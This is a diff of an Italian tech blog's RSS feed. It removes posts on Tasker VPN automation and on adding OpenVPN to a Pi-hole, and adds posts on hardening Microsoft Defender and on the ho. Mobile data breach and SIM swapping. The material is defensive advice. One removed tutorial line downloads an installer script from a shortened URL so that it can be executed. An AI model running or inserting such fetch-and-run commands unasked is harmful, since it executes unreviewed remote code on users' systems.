-&lt;p&gt;Nel form che vi compare, dovete semplicemente inserire il &lt;strong&gt;nome della vostra rete WiFi&lt;/strong&gt; nel campo &lt;strong&gt;SSID&lt;/strong&gt; e lasciare tutto il resto invariato. Ora premendo indietro per tornare alla pagina principale vi comparirà automaticamente un menu rapido dal quale possiamo scegliere l&amp;rsquo;azione da eseguire quando si attiverà questo profilo. In questo specifico caso dovete selezionare &lt;strong&gt;&amp;ldquo;Stop VPN&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;Ed ecco quindi che abbiamo creato il primo profilo:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SE&lt;/strong&gt; [WiFi di casa connesso] &lt;strong&gt;È VERO, ALLORA&lt;/strong&gt; [Disconnetti VPN]&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_20181125-161151-2.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h3 id=&#34;non-wifi-collegato&#34;&gt;
-  Non WIFI Collegato
-  &lt;a href=&#34;#non-wifi-collegato&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;Passiamo quindi alla creazione del profilo &lt;strong&gt;&amp;ldquo;Non WIFI Collegato&amp;rdquo;&lt;/strong&gt;. Dobbiamo dire che se il WiFi viene scollegato, deve connettersi automaticamente la VPN.&lt;/p&gt;
-&lt;p&gt;Procediamo quindi allo stesso modo nella tab &lt;strong&gt;Profili&lt;/strong&gt;, premiamo &lt;strong&gt;+&lt;/strong&gt;, selezioniamo &lt;strong&gt;Stato&lt;/strong&gt; dal menu a scomparsa, poi &lt;strong&gt;Rete&lt;/strong&gt; e &lt;strong&gt;WIFI Collegato&lt;/strong&gt;. A questo punto dobbiamo semplicemente mettere la spunta su &lt;strong&gt;Inverti&lt;/strong&gt; lasciando tutto vuoto.&lt;/p&gt;
-&lt;p&gt;Torniamo indietro e ci verrà riproposto lo stesso menu rapido di prima, dove selezioniamo &lt;strong&gt;&amp;ldquo;Start VPN&amp;rdquo;&lt;/strong&gt;.&lt;/p&gt;
-&lt;p&gt;Facendo così, abbiamo creato anche il nostro secondo profilo:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;SE&lt;/strong&gt; [WiFi non connesso] &lt;strong&gt;È VERO, ALLORA&lt;/strong&gt; [Connetti VPN]&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_20181125-161157-2.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;salvataggio-della-configurazione&#34;&gt;
-  Salvataggio della configurazione
-  &lt;a href=&#34;#salvataggio-della-configurazione&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Ora che abbiamo creato le azioni e i profili, non resta che salvare tutta la configurazione. Per farlo è sufficiente premere il &lt;strong&gt;check&lt;/strong&gt; sulla barra del titolo e Tasker si attiverà.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_20181125-162303.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;autorizzare-tasker-per-linterazione-con-openvpn&#34;&gt;
-  Autorizzare Tasker per l&amp;rsquo;interazione con OpenVPN
-  &lt;a href=&#34;#autorizzare-tasker-per-linterazione-con-openvpn&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Alla prima esecuzione di un&amp;rsquo;attività potrebbe apparirvi un popup di richiesta autorizzazione. Questo è un avviso di sicurezza di &lt;strong&gt;OpenVPN per Android&lt;/strong&gt; per indicarvi che un&amp;rsquo;applicazione di terze parti vuole interagire con i profili VPN. Qui dovete semplicemente &lt;strong&gt;mettere la spunta&lt;/strong&gt; per considerare Tasker attendibile e fare &lt;strong&gt;Ok&lt;/strong&gt;.&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/Screenshot_20181125-170252-2.png&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;h2 id=&#34;considerazioni-finali&#34;&gt;
-  Considerazioni finali
-  &lt;a href=&#34;#considerazioni-finali&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h2&gt;
-&lt;p&gt;Sto utilizzando questa configurazione da circa un mesetto e posso confermarvi che il setup è abbastanza solido. So per certo però che i più attenti di voi non potranno fare a meno di notare che c&amp;rsquo;è un piccolo &amp;ldquo;bug&amp;rdquo; nella mia configurazione, che si presenta nella situazione in cui si passa dalla rete WiFi di casa direttamente ad un&amp;rsquo;altra rete WiFi. In questo specifico caso infatti il profilo &amp;ldquo;Non WIFI Collegato&amp;rdquo; non entra in azione, poiché il dispositivo migra direttamente da una rete WiFi ad un&amp;rsquo;altra, non scatenando l&amp;rsquo;evento che fa switchare il profilo.&lt;/p&gt;
-&lt;p&gt;La situazione potrebbe sembrare di facile risoluzione semplicemente inserendo il nome dell&amp;rsquo;SSID di casa insieme al parametro Inverti (SE ![SSID di Casa]), tuttavia impostando così il profilo ho riscontrato che viene attivato erroneamente nel momento in cui il telefono si connette in VPN, generando così un loop di connessione e disconnessione continua.&lt;/p&gt;
-&lt;p&gt;Ammetto di non avere indagato a fondo, tuttavia il setup così impostato è perfetto per la mia esperienza d&amp;rsquo;uso, ovvero:&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Sono a casa -&amp;gt;&lt;/strong&gt; Profilo &amp;ldquo;WiFi Collegato&amp;rdquo;, navigo in rete locale.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Fuori casa in 4G -&amp;gt;&lt;/strong&gt; Mi sgancio dal wifi, si attiva &amp;ldquo;Non WiFi Collegato&amp;rdquo; e navigo in VPN.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Mi collego ad altri WiFi -&amp;gt;&lt;/strong&gt; La condizione per &amp;ldquo;WiFi Collegato&amp;rdquo; non viene rispettata in quanto SSID differente, quindi continuo a navigare in VPN.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;Torno a casa -&amp;gt;&lt;/strong&gt; Rileva connessione al WiFi domestico, entra &amp;ldquo;WiFi Collegato&amp;rdquo; che disconnette la VPN.&lt;/p&gt;
-&lt;p&gt;E con questo è tutto. Se avete bisogno di ulteriori informazioni, segnalarmi degli errori o fornirmi feedback, scrivetemi! ☺️&lt;/p&gt;
-
-        
-        </description>
-    </item>
-    
-    <item>
-      <title>VPPN: Virtual Private &#34;Pi-Holed&#34; Network</title>
-      <link>/post/virtual-private-pi-holed-network/</link>
-      <pubDate>Fri, 02 Nov 2018 16:34:08 +0000</pubDate>
-      
-      <guid>/post/virtual-private-pi-holed-network/</guid>
-      <description>
-        
-          &lt;img src=&#34;/images/pihole1-1.jpg&#34;/&gt;
-          
-        
-        
-        &lt;p&gt;Chi mi conosce sa molto bene che provo un amore incondizionato per &lt;a href=&#34;https://pi-hole.net/&#34;&gt;Pi-Hole&lt;/a&gt;. Navigare in una rete non protetta da Pi-Hole mi fa sentire nudo e vulnerabile, perché Pi-Hole non è un semplice ad-blocker, è un incredibile strumento per alzare in modo considerevole la sicurezza della navigazione.&lt;/p&gt;
-&lt;p&gt;Senza gli ads, si riduce quasi del 100% la possibilità di venire dirottati su qualche pagina malevola a causa di malvertising.&lt;/p&gt;
-&lt;p&gt;Per esempio, attacchi di questo tipo verrebbero completamente neutralizzati grazie a Pi-Hole:&lt;/p&gt;
-
-    &lt;style type=&#34;text/css&#34;&gt;
-      .twitter-tweet {
-        font: 14px/1.45 -apple-system,BlinkMacSystemFont,&#34;Segoe UI&#34;,Roboto,Oxygen-Sans,Ubuntu,Cantarell,&#34;Helvetica Neue&#34;,sans-serif;
-        border-left: 4px solid #2b7bb9;
-        padding-left: 1.5em;
-        color: #555;
-      }
-      .twitter-tweet a {
-        color: #2b7bb9;
-        text-decoration: none;
-      }
-      blockquote.twitter-tweet a:hover,
-      blockquote.twitter-tweet a:focus {
-        text-decoration: underline;
-      }
-    &lt;/style&gt;
-  &lt;blockquote class=&#34;twitter-tweet&#34; data-dnt=&#34;true&#34;&gt;&lt;p lang=&#34;en&#34; dir=&#34;ltr&#34;&gt;Brand new Win10 laptop. Attempt to install Chrome.  Almost get owned with my very first action.  Why is this still happening in 2018, &lt;a href=&#34;https://twitter.com/bing?ref_src=twsrc%5Etfw&#34;&gt;@bing&lt;/a&gt;?  Please explain. &lt;a href=&#34;https://t.co/uYJhu7xa9H&#34;&gt;pic.twitter.com/uYJhu7xa9H&lt;/a&gt;&lt;/p&gt;&amp;mdash; Gabriel Landau (@GabrielLandau) &lt;a href=&#34;https://twitter.com/GabrielLandau/status/1055300918101598208?ref_src=twsrc%5Etfw&#34;&gt;October 25, 2018&lt;/a&gt;&lt;/blockquote&gt;
-
-&lt;p&gt;Fin dai primi giorni di utilizzo ho desiderato poter avere lo stesso livello di protezione anche in mobilità con lo smartphone. L&amp;rsquo;idea era quella di fare una VPN per dirottare tutto il traffico di navigazione nella rete di casa e far gestire quindi i DNS da Pi-Hole. Purtroppo questa idea è durata qualche secondo, giusto il tempo di ricordarsi di avere una misera aDSL da 8Mbps/700Kbps. #FuckDigitalDivideNon potendo fare una VPN domestica a causa delle scarse prestazioni della mia rete, ho adottato per diverso tempo una VPN di terze parti, nello specifico F-Secure Freedome, che implementa un filtro per siti malevoli e tracking. Non siamo ai livelli di Pi-Hole, però mi ha aiutato a navigare in modo sicuro anche in mobilità negli ultimi due anni.&lt;/p&gt;
-&lt;p&gt;Ora però la musica è cambiata. Ora ho cambiato casa e ho finalmente a disposizione una connessione stratosferica, 1Gbps/200Mbps con OpenFiber!&lt;/p&gt;
-
-  &lt;figure class=&#34;left&#34; &gt;
-    &lt;img src=&#34;/images/asdasdasdasda.gif&#34;   /&gt;
-    
-  &lt;/figure&gt;
-
-
-&lt;p&gt;Appena ho collegato il router e ho provato con mano l&amp;rsquo;incredibile velocità, l&amp;rsquo;idea della VPN è tornata a solleticarmi, così una sera mi sono messo comodo sul divano e ho realizzato la mia &lt;strong&gt;Virtual Private Pi-Holed Network&lt;/strong&gt;!&lt;/p&gt;
-&lt;p&gt;Nota: esiste una &lt;a href=&#34;https://docs.pi-hole.net/guides/vpn/overview/&#34;&gt;guida ufficiale molto ben dettagliata&lt;/a&gt;, da cui ho preso informazioni a piene mani, tuttavia parte da una Raspbian pulita senza nulla, ci installa prima OpenVPN e poi Pi-Hole. E&amp;rsquo; molto più facile invece trovarsi in una situazione dove si ha un RPi con Pi-Hole già installato e configurato e si desidera installarci sopra la VPN.&lt;/p&gt;
-&lt;p&gt;Ed è esattamente quello che faremo ora.&lt;/p&gt;
-&lt;p&gt;Situazione di partenza: Raspberry Pi nella rete locale con Raspbian Lite e Pi-Hole installato e funzionante. Darò per scontato che se siete arrivati qui, sapete connettervi in SSH al vostro RPi. Consiglio prima di partire con l&amp;rsquo;installazione, di fare un controllo su eventuali aggiornamenti disponibili:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt upgrade
-&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;installiamo-openvpn-su-pi-hole&#34;&gt;
-  Installiamo OpenVPN su Pi-Hole
-  &lt;a href=&#34;#installiamo-openvpn-su-pi-hole&#34; class=&#34;h-anchor&#34; aria-hidden=&#34;true&#34;&gt;#&lt;/a&gt;
-&lt;/h3&gt;
-&lt;p&gt;La prima cosa da fare è scaricare e installare OpenVPN &lt;a href=&#34;https://en.wikipedia.org/wiki/Road_warrior_(computing)&#34;&gt;road warrior&lt;/a&gt;. Connettetevi in SSH al RPi ed eseguite questo comando:&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://git.io/vpn -O openvpn-install.sh
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Gabriele Tips</title><link>/</link><description>Recent content on Gabriele Tips</description><generator>Hugo -- gohugo.io</generator><language>it-it</language><lastBuildDate>Sun, 20 Mar 2022 14:18:12 +0000</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml"/><item><title>Configurare correttamente Microsoft Defender</title><link>/post/configurare-correttamente-microsoft-defender/</link><pubDate>Sun, 20 Mar 2022 14:18:12 +0000</pubDate><guid>/post/configurare-correttamente-microsoft-defender/</guid><description>
+&lt;img src="/images/defender-header.webp"/>
+&lt;p>Windows include Microsoft Defender, un software antimalware integrato con il sistema in grado di proteggere il computer dalle minacce più recenti.&lt;/p>
+&lt;p>Negli ultimi anni Microsoft ha fatto enormi investimenti ed evoluzioni per alzare il livello di sicurezza di base di Defender. I primi tentativi lasciavano un po&amp;rsquo; a desiderare, tuttavia recentemente è arrivato a competere con le soluzioni di protezione più famose e in alcuni casi ne esce persino migliore.&lt;/p>
+&lt;p>Defender, nella sua configurazione di base, offre una protezione che si potrebbe considerare già sopra la media, tuttavia nasconde delle opzioni che possono essere attivate manualmente per incrementare di molto il livello di protezione e la sicurezza dell&amp;rsquo;intero sistema.&lt;/p>
+&lt;p>Alcune di queste opzioni si attivano dalle Impostazioni di Windows, altre invece sono un po&amp;rsquo; più nascoste e si attivano solamente tramite dei comandi PowerShell.&lt;/p>
+&lt;p>Fortunatamente, esiste un semplice strumento di terze parti che permette di configurare tutte queste opzioni da una comoda interfaccia.&lt;/p>
+&lt;blockquote>
+&lt;p>Se si possiede una soluzione di protezione a pagamento con l&amp;rsquo;abbonamento scaduto, occorre disinstallarla immediatamente. Una protezione in abbonamento senza licenza è totalmente inefficace e vi fornisce una falsa sensazione di sicurezza!&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="configure-defender">
+Configure Defender
+&lt;a href="#configure-defender" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Lo strumento si chiama Configure Defender e lo possiamo scaricare da questo repository GitHub. L&amp;rsquo;eseguibile da scaricare è &amp;ldquo;ConfigureDefender.exe&amp;rdquo;.&lt;/p>
+&lt;p>&lt;a href="https://github.com/AndyFul/ConfigureDefender">https://github.com/AndyFul/ConfigureDefender&lt;/a>&lt;/p>
+&lt;p>All&amp;rsquo;apertura veniamo accolti con una serie di pulsanti e selettori, raggruppati per sezioni.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/configure-defender.png" />
+&lt;figcaption class="center" >L&amp;rsquo;interfaccia principale di ConfigureDefender&lt;/figcaption>
+&lt;/figure>
+&lt;p>È possibile andare ad impostare ogni singola voce, oppure usare delle configurazione pre-impostate ottimali.&lt;/p>
+&lt;p>Nello specifico, l&amp;rsquo;impostazione che consiglio di attivare è &lt;strong>HIGH&lt;/strong>.&lt;/p>
+&lt;p>L&amp;rsquo;impostazione HIGH attiva molte delle funzionalità di protezione contro gli exploit, attiva la Network Protection e molte delle regole di riduzione della superficie di attacco (ASR).&lt;/p>
+&lt;p>&lt;strong>Per attivarla è sufficiente cliccare su HIGH, attendere qualche secondo la comparsa della finestra di conferma e riavviare il computer.&lt;/strong>&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/image-2.png" />
+&lt;figcaption class="center" >Avviso di conferma di avvenuta configurazione&lt;/figcaption>
+&lt;/figure>
+&lt;p>&lt;strong>Fatto! In pochi minuti avete appena eseguito un aggiornamento veramente sostanziale a Microsoft Defender e alla sicurezza del vostro computer.&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>Questa configurazione funziona solamente se non sono presenti altre soluzioni di protezione antivirus installate nel sistema (es. McAfee, Norton, etc&amp;hellip;).&lt;/p>
+&lt;/blockquote>
+&lt;p>Ma cosa abbiamo fatto? Se siete curiosi, vediamo un po&amp;rsquo; nel dettaglio qualche impostazione.&lt;/p>
+&lt;h2 id="funzionalità-antimalware-attivate-con-limpostazione-high">
+Funzionalità antimalware attivate con l&amp;rsquo;impostazione HIGH
+&lt;a href="#funzionalit%c3%a0-antimalware-attivate-con-limpostazione-high" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;h4 id="pua-protection-on">
+PUA Protection [On]
+&lt;a href="#pua-protection-on" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h4>
+&lt;p>Le applicazioni potenzialmente indesiderate (PUA) sono una categoria di software che può rallentare il funzionamento del computer, visualizzare annunci indesiderati o, nel peggiore dei casi, installare altro software senza il vostro consenso. Protezione imprescindibile.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;em>Approfondimento tecnico:&lt;/em>&lt;/p>
+&lt;p>&lt;a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/detect-block-potentially-unwanted-apps-microsoft-defender-antivirus?view=o365-worldwide">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/detect-block-potentially-unwanted-apps-microsoft-defender-antivirus?view=o365-worldwide&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h4 id="cloud-protection-level-highest">
+Cloud Protection Level [Highest]
+&lt;a href="#cloud-protection-level-highest" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h4>
+&lt;p>La protezione Cloud è la forma di protezione più avanzata presente nei moderni antivirus e antimalware. Usa la potenza di elaborazione del Cloud per determinare se un file è o meno una minaccia. Per farla breve, abbiamo girato la manopola un po&amp;rsquo; più aggressiva.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;em>Approfondimento tecnico:&lt;/em>&lt;/p>
+&lt;p>&lt;a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/specify-cloud-protection-level-microsoft-defender-antivirus?view=o365-worldwide">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/specify-cloud-protection-level-microsoft-defender-antivirus?view=o365-worldwide&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h4 id="cloud-check-time-limit-20s">
+Cloud Check Time Limit [20s]
+&lt;a href="#cloud-check-time-limit-20s" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h4>
+&lt;p>Quando Microsoft Defender trova un nuovo file sospetto, può impedire l&amp;rsquo;esecuzione del file mentre verifica sul servizio Cloud di protezione l&amp;rsquo;esito della scansione. Questa funzione si chiama BAFS (Block At First Sight).&lt;/p>
+&lt;p>Il periodo predefinito per il blocco del file è di 10 secondi, con questa impostazione l&amp;rsquo;abbiamo portato ad un massimo 20 secondi.&lt;/p>
+&lt;p>Terminati i 20 secondi, se Defender non ha ancora ricevuto una risposta, il file verrà sbloccato ed eseguito, ma la scansione continuerà comunque nel Cloud fino alla ricezione del risultato. Se dovesse risultare malevolo dopo i 20 secondi, il file verrà inserito in quarantena.&lt;/p>
+&lt;p>Nella maggior parte dei casi, il risultato della scansione Cloud avviene ben prima dei 20 secondi.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;em>Approfondimento tecnico:&lt;/em>&lt;/p>
+&lt;p>&lt;a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-cloud-block-timeout-period-microsoft-defender-antivirus?view=o365-worldwide">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/configure-cloud-block-timeout-period-microsoft-defender-antivirus?view=o365-worldwide&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h4 id="exploit-guard-attack-surface-reduction-asr">
+EXPLOIT GUARD Attack Surface Reduction (ASR)
+&lt;a href="#exploit-guard-attack-surface-reduction-asr" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h4>
+&lt;p>Nella sezione EXPLOIT GUARD di Configure Defender vengono riportate tutte le impostazioni attivate per la riduzione della superficie di attacco.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/image-3.png" />
+&lt;figcaption class="center" >Sezione relativa alle regole ASR&lt;/figcaption>
+&lt;/figure>
+&lt;p>Queste funzionalità di riduzione della superficie di attacco sono l&amp;rsquo;introduzione più interessante fatta da Microsoft negli ultimi anni. Le regole ASR mirano a chiudere o disattivare funzionalità di sistema pericolose che non vengono quasi mai usate dagli utenti, ma vengono spesso abusate dai malware per eseguire comandi malevoli e ottenere l&amp;rsquo;accesso al computer.&lt;/p>
+&lt;p>Per dirla breve, mette le sbarre a quella finestra che non usate mai e non sapete di avere, ma che fa tanto gola ai ladri.&lt;/p>
+&lt;p>Le regole ASR sono numerose e la loro spiegazione nel dettaglio può risultare complessa per chi non è molto pratico. Oltretutto, l&amp;rsquo;attivazione di una regola ASR può comportare dei falsi positivi, ovvero il blocco del funzionamento di una applicazione benigna.&lt;/p>
+&lt;p>La configurazione a HIGH attiva solamente le regole ASR che nel 99% dei casi non causano problemi nell&amp;rsquo;uso quotidiano, ma bloccano la stragrande maggioranza delle funzionalità di Windows usate dai malware. Per fare qualche esempio:&lt;/p>
+&lt;ul>
+&lt;li>impedisce alle macro di Office di fare chiamate di sistema pericolose&lt;/li>
+&lt;li>impedisce agli scripts di lanciare eseguibili scaricati da internet&lt;/li>
+&lt;li>impedisce l&amp;rsquo;esecuzione di scripts offuscati, spesso nascosti negli allegati e-mail&lt;/li>
+&lt;li>blocca l&amp;rsquo;esecuzione di processi non firmati da chiavette USB&lt;/li>
+&lt;/ul>
+&lt;p>La lista delle regole ASR è in costante aumento e verranno introdotte molte altre regole nel prossimo futuro.&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;em>Approfondimento tecnico:&lt;/em>&lt;/p>
+&lt;p>&lt;a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide">https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>&lt;em>Se volete leggere l&amp;rsquo;esperienza di un team tecnico che ha implementato le ASR in ambiente business corporate:&lt;/em>&lt;/p>
+&lt;p>&lt;a href="https://blog.palantir.com/microsoft-defender-attack-surface-reduction-recommendations-a5c7d41c3cf8">https://blog.palantir.com/microsoft-defender-attack-surface-reduction-recommendations-a5c7d41c3cf8&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;h4 id="network-protection-on">
+Network Protection [ON]
+&lt;a href="#network-protection-on" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h4>
+&lt;p>La Network Protection è abbastanza parlante e il suo funzionamento è molto semplice: impedisce di accedere a domini e IP pericolosi come phishing, scam e siti che ospitano malware.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/image-4.png" />
+&lt;figcaption class="center" >Notifica di blocco&lt;/figcaption>
+&lt;/figure>
+&lt;h2 id="altre-impostazioni-avanzate-per-esperti">
+Altre impostazioni avanzate per esperti
+&lt;a href="#altre-impostazioni-avanzate-per-esperti" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>Come avrete notato, Microsoft Defender presenta molte altre funzioni che la configurazione HIGH non ha attivato. Sono funzioni avanzate, che possono generare falsi positivi se non vengono gestite correttamente.&lt;/p>
+&lt;p>Consiglio di approfondire il funzionamento solo se si è consapevoli e se sapete fare una ricerca tecnica su Google.&lt;/p>
+&lt;p>Per esempio la funzione di Controlled Folder Access permette di impedire ai ransomware di cifrare le cartelle dei documenti, ma la protezione è estremamente severa e il rischio di bloccare l&amp;rsquo;accesso ad applicazioni sicure è molto frequente. Attivatela solo se siete disposti a voler gestire qualche falso positivo da aggiungere alle esclusioni.&lt;/p>
+&lt;p>Volendo è possibile impostare Defender in modalità &amp;ldquo;paranoia&amp;rdquo;, bloccando tutti gli eseguibili che non hanno raggiunto un certo livello di prevalenza, età o non vengano aggiunti ad una lista sicura da parte di Microsoft.&lt;/p>
+&lt;figure class="left" >
+&lt;img src="/images/image-5.png" />
+&lt;/figure>
+&lt;p>È una funzionalità estremamente utile per i computer che necessitano di un livello di protezione senza compromessi, ma il rischio di vedersi bloccato qualche aggiornamento di un software che usate solo voi e pochi altri è estremamente elevato.&lt;/p>
+&lt;h2 id="testare-il-corretto-funzionamento">
+Testare il corretto funzionamento
+&lt;a href="#testare-il-corretto-funzionamento" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h2>
+&lt;p>La configurazione proposta è pensata per un uso massivo comune e non dovrebbe causare falsi positivi nell&amp;rsquo;uso quotidiano. Nello specifico, l&amp;rsquo;unica parte che potrebbe causare qualche falso positivo in qualche caso specifico sono le regole ASR, ma mi vengono in mente solo scenari aziendali con software particolari tipo gestionali balordi mal progettati o macro incredibilmente complesse che operano ad un livello molto integrato con il sistema.&lt;/p>
+&lt;p>Per un uso domestico o piccolo ufficio, questa configurazione garantisce un aumento considerevole della sicurezza con un rischio pressoché nullo di falsi positivi.&lt;/p></description></item><item><title>Furto dati ho. Mobile – Cosa rischio? Cosa fare?</title><link>/post/furto-dati-ho-mobile-cosa-rischio-cosa-fare/</link><pubDate>Mon, 04 Jan 2021 14:18:04 +0000</pubDate><guid>/post/furto-dati-ho-mobile-cosa-rischio-cosa-fare/</guid><description>
+&lt;img src="/images/EqXOP0VXAAAsVwX.webp"/>
+&lt;p>Probabilmente ne avrete sentito parlare, il 28 dicembre un utente anonimo su un forum del dark web affermava di aver violato l’operatore virtuale di Vodafone, “ho. Mobile”, rubando una notevole quantità di dati personali tra nome, cognome, numero di telefono, codice fiscale, e-mail, data e luogo di nascita, nazionalità e indirizzo e ultimo, ma non meno importante, il codice ICCID della SIM per effettuare la portabilità del numero ad un altro operatore.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/image.png" />
+&lt;/figure>
+&lt;p>Dopo le prime smentite da parte dell’operatore, oggi è arrivata la conferma della violazione con un comunicato ufficiale che trovate a questa pagina: &lt;a href="https://sendy.logotel.it/l/K64763I7GOqtsi7Z892fEC2xUQ/hFNWHsGh2r56vc8wtvPXfg/ctbpaBfqUDNAywODAY9cTg">https://www.ho-mobile.it/comunicazione/&lt;/a>&lt;/p>
+&lt;h3 id="sono-utente-di-ho-mobile-mi-devo-preoccupare-cosa-rischio-">
+Sono utente di &amp;ldquo;ho. Mobile&amp;rdquo;, mi devo preoccupare? Cosa rischio? 📱
+&lt;a href="#sono-utente-di-ho-mobile-mi-devo-preoccupare-cosa-rischio-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>I dati che sono stati rubati sono una lista piuttosto dettagliata di informazioni personali, quindi i criminali ora hanno nome, cognome, indirizzo fisico, indirizzo mail, numero di telefono e codice fiscale di due milioni e mezzo di italiani. Questi dati possono essere utilizzati in futuro per attacchi di phishing mirati e furti di identità.&lt;/p>
+&lt;h3 id="devo-fare-qualcosa-per-proteggermi-">
+Devo fare qualcosa per proteggermi? 🛡
+&lt;a href="#devo-fare-qualcosa-per-proteggermi-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>È importante prepararsi ad un possibile aumento ti attacchi costruiti sulla base dei dati personali rubati. Non fidatevi di SMS o di mail dove vi viene chiesto di reinserire le credenziali per l’accesso ai vostri account bancari, o di inserire il numero della carta di credito per sbloccare un pagamento. Nel dubbio, fate sempre una verifica chiamando la banca o il servizio da cui avete ricevuto il messaggio per informarli della comunicazione ricevuta e verificarne l&amp;rsquo;autenticità. Reperite sempre i numeri di telefono e gli indirizzi mail dai siti ufficiali.&lt;/p>
+&lt;h3 id="non-ho-ancora-ricevuto-la-comunicazione-diretta-da-parte-di-ho-mobile-lho-scampata-">
+Non ho ancora ricevuto la comunicazione diretta da parte di &amp;ldquo;ho. Mobile&amp;rdquo;. L’ho scampata? 🖖
+&lt;a href="#non-ho-ancora-ricevuto-la-comunicazione-diretta-da-parte-di-ho-mobile-lho-scampata-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>No. Secondo le prime verifiche ufficiose, il database comprende circa due milioni e mezzo di utenti e sembrerebbe coinvolgere l’intera base di clienti di &amp;ldquo;ho. Mobile&amp;rdquo;. Il comunicato ufficiale è stato rilasciato solamente questa mattina e la comunicazione ai diretti interessati sta iniziando ad arrivare proprio in queste ore tramite SMS.&lt;/p>
+&lt;figure class="center" >
+&lt;img src="/images/1609767079.png" />
+&lt;/figure>
+&lt;h3 id="ho-letto-che-possono-rubarmi-il-conto-in-banca-è-vero-">
+Ho letto che possono rubarmi il conto in banca, è vero? 💸
+&lt;a href="#ho-letto-che-possono-rubarmi-il-conto-in-banca-%c3%a8-vero-" class="h-anchor" aria-hidden="true">#&lt;/a>
+&lt;/h3>
+&lt;p>Estremamente improbabile, ma non impossibile.&lt;/p>
+&lt;p>Tra i dati rubati c’era anche un numero, chiamato ICCID. Questo numero è una specie di seriale univoco della SIM e con quello è possibile effettuare la migrazione del proprio numero di telefono ad un nuovo operatore. Questo numero in mano a malintenzionati apre le porte ad un attacco molto pericoloso: il SIM swapping. Questa tecnica fraudolenta permette ad un malintenzionato di richiedere la portabilità verso un altro operatore con lo scopo di dirottare gli SMS, usati oggi per l’autenticazione a due fattori di molte banche, verso una nuova SIM di sua proprietà.&lt;/p>
